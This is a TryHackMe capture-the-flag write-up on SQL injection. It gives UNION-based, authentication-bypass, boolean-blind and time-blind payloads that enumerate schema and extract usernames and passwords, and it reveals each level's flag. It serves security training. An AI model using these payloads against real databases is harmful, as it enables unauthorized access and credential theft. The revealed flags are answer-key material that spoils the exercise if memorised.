![Sql Injection Banner](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/sql_injection/Sql_Injection_Banner.png)

<p align="center">
   <img src="https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/sql_injection/SQLI_Cover.png" alt="SQL Injection Cover">
</p>

# [SQL Injection](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/sql_injection)

## Table of Contents

- [In-Band SQLi](#in-band-sqli)
- [Blind SQLi - Authentication Bypass](#blind-sqli---authentication-bypass)
- [Blind SQLi - Boolean Based](#blind-sqli---boolean-based)
- [Blind SQLi - Time Based](#blind-sqli---time-based)

## In-Band SQLi

1. What is the flag after completing level 1?

   In this task we will retrieve a users password by using the information returned to us when exploiting the SQL queries.
   
   To start we add an `'` after the `id=1` statement in the browser to see if it is vulnerable to SQLi. Since we get an error, there is probably no proper filtering put in place. We can use the `UNION argument to get extra information. We first need to find the number of columns. Using the following command, adding numbers until we get no error message.
   
   ```cmd
   ' UNION SELECT 1,2,3;--
   ```
   
   No we can get more information on the database. To suppress the output of the article we can add `0'` in front of the query.
   
   ```cmd
   0' UNION SELECT 1,2,database();--
   ```
   
   This gives us the name of the database, which is `sqli_one`. Next we need to find the table names.
   
   ```cmd
   0' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema='sqli_one';--
   ```
   
   This uses `information_schema` to display information about the database and its entries. Here we find the tables `article` and `staff_users`. The latter one is of more interest to us if we want to find someones credentials. Now we move on the find the folumn names in the `staff_users` table.
   
   ```cmd
   0' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users';--
   ```
   
   This gives us three columns: `id`, `username`, and `password`. Now we can enumerate the conents of this table while using some formatting to make it readable.
   
   ```cmd
   0' UNION SELECT 1,2,group_concat(username, ':', password SEPARATOR '<br>') FROM staff_users;--
   
   ![SQLi In Band](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/sql_injection/SQLI_Inband_Found.png)

   ><details><summary>Click for answer</summary>THM{SQL_INJECTION_3840}</details>

## Blind SQLi - Authentication Bypass

1. What is the flag after completing level two? (and moving to level 3)

   In this task we are facing blind SQLi, where we don't get any feedback from our query. This is often the case when attempting to bypass login screesns. One of the most common/basic methods is to make sure the statement is always true. We can do this by escaping the query and writing a statement which is always true.
   
   ```cmd
   ' OR 1=1;--
   ```
   
   ![SQLi Authentication Bypass](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/sql_injection/SQLI_Authentication_Bypass_Found.png)

   ><details><summary>Click for answer</summary>THM{SQL_INJECTION_9581}</details>

## Blind SQLi - Boolean Based

1. What is the flag after completing level three?

   On level 3 we only get a true or false response to help us find the answer.
   
   We first need to find the number of columns using:
   
   ```cmd
   ' UNION SELECT 1,2,3;--
   ```
   
   Add as many columns as needed for the response to become true.
      
   To enumerate the database names, we can use the following method:
   
   ```cmd
   ' UNION SELECT 1,2,3 WHERE database() LIKE '%';--
   ```
   
   Try combinations before the `%` until we find a name. This time it is:
   
   ```cmd
   sqli_three
   ```
   
   To enumerate the table names within the database we use the following method:
   
   ```cmd
   ' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema="sqli_three" AND table_name LIKE '%';--
   ``
   
   Try combinations before the `%` until we find a name. This time it is:
   
   ```cmd
   users
   ```
   
   To enumerate the columns within this table we use the following method:
   
   ```cmd
   ' UNION SELECT 1,2,3 FROM information_schema.columns WHERE table_schema="sqli_three" AND table_name="users" AND column_name LIKE '%';--
   ```
   
   Try combinations before the `%` until we find a name. Then add it as 'column_name!=...' to make sure we don't get a hit on it again. This time we get:
   
   ```cmd
   'id', 'username', and 'password'
   ```
   
   Next we need to find any existing username. For this we use the same method as before:
   
   ```cmd
   ' UNION SELECT 1,2,3 FROM users WHERE username like '%';--
   ```
   
   After finding username `admin` we use the same method to find the corresponding password:
   
   ```cmd
   ' UNION SELECT 1,2,3 FROM users WHERE username='admin' AND password LIKE '%';--
   ```
   
   Going through all characters we find `3845`.

   ![SQLi Boolean](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/sql_injection/SQLI_Boolean_Based_Found.png)

   ><details><summary>Click for answer</summary>THM{SQL_INJECTION_1093}</details>

## Blind SQLi - Time Based

1. What is the final flag after completing level four?

   In this step, we get no feedback at all. The only way to get som information is to use the response time from the server. For this we add the `sleep()` command in the query to add a delay. This is executed if the query is true.
   
   The method is the same as the previous question. But we only get a different response time instead of a true or false statement. We start by enumerating the databases, then the tables and column names. Lastly, we enumerate for the username and password. In the end we get the following query.
   
   ```cmd
   admin123' UNION SELECT sleep(2),2 FROM users WHERE username='admin' AND password='4961';--
   ```
   
   ![SQLi Time Based](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/sql_injection/SQLI_Time_Based_Found.png)

   ><details><summary>Click for answer</summary>THM{SQL_INJECTION_MASTER}</details>
